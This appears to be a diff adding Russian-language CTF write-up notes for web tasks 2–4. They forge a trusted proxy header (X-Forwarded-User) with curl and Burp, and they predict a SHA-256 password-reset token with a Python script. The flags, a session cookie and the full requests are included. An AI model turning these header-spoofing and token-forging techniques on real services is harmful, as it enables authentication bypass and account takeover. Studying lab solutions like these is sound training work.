@@ -1,0 +1,89 @@
+ЗАДАНИЕ 2
+Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w2/
+Приложение экспорта ожидает, что reverse proxy передаст подтверждённого пользователя, но граница доверия настроена неверно. Получите JSON квартального экспорта. Не требуется обход чужих ID или эксплуатация файловой системы.
+//вывод страницы
+Экспорт аудита
+Шлюз должен передавать приложению подтверждённого пользователя в заголовке. Обычный запрос к /w2/export получает отказ.
+//вывод экспорта
+https://ctf.82.202.138.50.sslip.io/arena/w2/export
+{
+  "error": "auditor role required",
+  "observed_user": ""
+}
+//Решение
+Командная строка через curl передаем пользователя auditor
+Curl — это утилита командной строки, которая позволяет передавать данные по разным сетевым протоколам. Название расшифровывается как Client for URLs («клиент для URL»). По сути, это инструмент, который «разговаривает» с серверами по указанным адресам: отправляет запросы и получает ответы
+curl -H "X-Forwarded-User: auditor" \  "https://ctf.82.202.138.50.sslip.io/arena/w2/export" \ -v
+//флаг
+{"export":"quarterly","flag":"RTK{proxy_header_trust_boundary}"}
+
+//еще есть вариант через Burp Suite
+запустить браузера Burp Suite https://ctf.82.202.138.50.sslip.io/arena/w2/export
+на вкладку proxy нажать правой кнопкой на ссылку Send to repeater
+добавить в Request X-Forwarded-User: auditor
+
+GET /arena/w2/export HTTP/2
+Host: ctf.82.202.138.50.sslip.io
+X-Forwarded-User: auditor
+Cookie: session=36b0a95f-b66a-49f1-a003-1296d2ad4962.SQ_Jyehhj-Lg0EtO_iBCK_E0oPQ
+Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+ЗАДАНИЕ 3
+Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w3/
+
+Диагностическая версия восстановления доступа выдаёт время создания запроса и содержит клиентскую подсказку о legacy-схеме токена. Сформируйте действительный reset-token для пользователя auditor и получите флаг
+//Подсказка
+<p>Новая версия сервиса ещё не подключена к почте. Для диагностики время выпуска
+возвращается в заголовке <code>X-Issued-Minute</code>.</p>
+
+Надо спроверить значение X-Issued-Minute
+
+//Как вычислить токен
+console.info("legacy scheme: sha256(user:UTC-minute:PULSE-RESET-V1), first 16 hex")
+токен - хэш sha256, кодировка user:UTC-minute:PULSE-RESET-V1, первые 16 цифр
+делаем запрос
+https://ctf.82.202.138.50.sslip.io/arena/w3/request?user=auditor
+
+Возвращает значение X-Issued-Minute: 29784167 
+Это значение в секундах Linux. Проверить в интернет
+
+user - auditor
+Токен вычисляется по auditor:55:PULSE-RESET-V1, где 55 - текущие минуты, то есть токен действует минуту
+В итоге взял запрос на питон
+import hashlib
+import time
+
+minute = int(time.time() / 60)
+data = f"auditor:{minute}:PULSE-RESET-V1"
+full_hash = hashlib.sha256(data.encode()).hexdigest()
+token = full_hash[:16]
+
+print(f"Минута UTC: {minute}")
+print(f"Данные: {data}")
+print(f"Полный SHA-256: {full_hash}")
+print(f"ТОКЕН: {token}")
+
+//Получения флага
+GET /arena/w3/reset?user=auditor&token=f3d26b8b740c9b39 HTTP/2
+Необходимо в теле запроса изменить request на reset
+добавить токен - добавление через$
+&token=f3d26b8b740c9b39
+
+"flag":"RTK{predictable_reset_minute}","status":"diagnostic access granted"
+
+ЗАДАНИЕ 4
+Точка входа: https://ctf.82.202.138.50.sslip.io/arena/w4/
+
+Одноразовый купон должен давать один кредит, но проверка и изменение состояния разнесены во времени. Добейтесь баланса не менее трёх кредитов в одной cookie-сессии. Нагрузочное тестирование не нужно: достаточно нескольких одновременных запросов.
